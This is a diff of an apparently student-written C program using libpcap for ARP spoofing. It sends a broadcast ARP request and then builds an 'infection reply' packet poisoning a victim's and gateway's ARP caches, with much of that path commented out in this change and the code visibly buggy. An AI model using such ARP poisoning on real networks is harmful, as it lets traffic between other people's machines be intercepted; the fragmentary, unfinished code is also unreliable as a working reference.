@@ -36,27 +36,26 @@ void make_t_mac(const u_char *pkt_data, u_int8_t a[], char *b); //get mac addr f
 
 int main(int argc, char *argv[])
 {
-    /*
-    u_char a;
-    a=system("ifconfig -a | grep ether | awk '{print $2}'");
-    sscanf((const char*)a, "%x:%x:%x:%x:%x:%x",&mm[0],&mm[1],&mm[2],&mm[3],&mm[4],&mm[5]);
+//--------------------------------------------------------------
 
-*/
-    u_int8_t mm[6];//mymac
+    char mm[17];//mymac
     FILE *a;
     a=popen("ifconfig -a | grep ether | awk '{print $2}'","r");
+
 
     if (a == NULL)
     {
         perror("error : ");
         exit(0);
     }
-    while(fgets((char*)mm, sizeof(a), a) != NULL)
-    {
-        printf("%s", mm);
-    }
-    sscanf((const char*)a, "%x:%x:%x:%x:%x:%x",&mm[0],&mm[1],&mm[2],&mm[3],&mm[4],&mm[5]);
 
+    fgets((char*)mm,18, a);
+    printf("%s\n", mm);
+    Mac mymac;
+    mymac=mm;
+
+//--------------------------------------------------------------
+     /*//--fix temp
     if(argc != 5) //fix 4!!
     {
         printf("you must enter 4 parameter!!\n ");
@@ -64,7 +63,9 @@ int main(int argc, char *argv[])
         return 0;
     }
     char *dev=argv[1];
-    /*=====================================Auto GET victim MAC Addr===================================*/
+    //=====================================Auto GET victim MAC Addr===================================
+
+
     Mac des_mac;
     des_mac="ff:ff:ff:ff:ff:ff";
 
@@ -126,7 +127,7 @@ int main(int argc, char *argv[])
     {
         fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(fp));
     }
-  /*  /////////////////////////////////////////////////////////////////////////////////////////////////*/
+  //  /////////////////////////////////////////////////////////////////////////////////////////////////
     //look reply ip!!!  <--fix
     int res;
     u_int8_t tm[6]; //tm, arp_tm -> get reply from mac addr
@@ -144,7 +145,7 @@ int main(int argc, char *argv[])
 
 
 
-/*//////////////////////////////////////////////////////infection reply start//////////////////////////////////////////////////////////////*/
+//-//////////////////////////////////////////////////////infection reply start//////////////////////////////////////////////////////////////
 
 
 //--------------------------------------------------------------------------------------ethernet protocol
@@ -187,7 +188,8 @@ int main(int argc, char *argv[])
         memcpy(packet+28,&s_ip,4);
         memcpy(packet+32,&tm,6);
         memcpy(packet+38,&t_ip,4);
-
+*/ //--fix temp
+     /*
         pcap_t *fpp;
 
         //---------------------------------------------------------------------------------------send reply arp
@@ -196,17 +198,17 @@ int main(int argc, char *argv[])
         {
             printf("%s\n",errbuf);
             return 0;
-        }/*
+        }
         while(fpp!=NULL)
-        {*/
+        {
             if(pcap_sendpacket(fpp,(u_char*)packet,42) != 0)
             {
                 fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(fpp));
-            }/*
+            }
             //sleep(1);
-        }*/
+        }
 
-/*=========================================================================================*/
+//=========================================================================================
 //request gateway
 
 
@@ -245,32 +247,12 @@ int main(int argc, char *argv[])
     if(pcap_sendpacket(gp,(u_char*)rqgate_packet,42) != 0)
     {
        fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(gp));
-    }
+    }*/
 
-
+}
 //------------------------------reply gate mac-------------------------------------------------
 
 //start here
-
-
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 void make_t_mac(const u_char *pkt_data, u_int8_t a[], char *b)
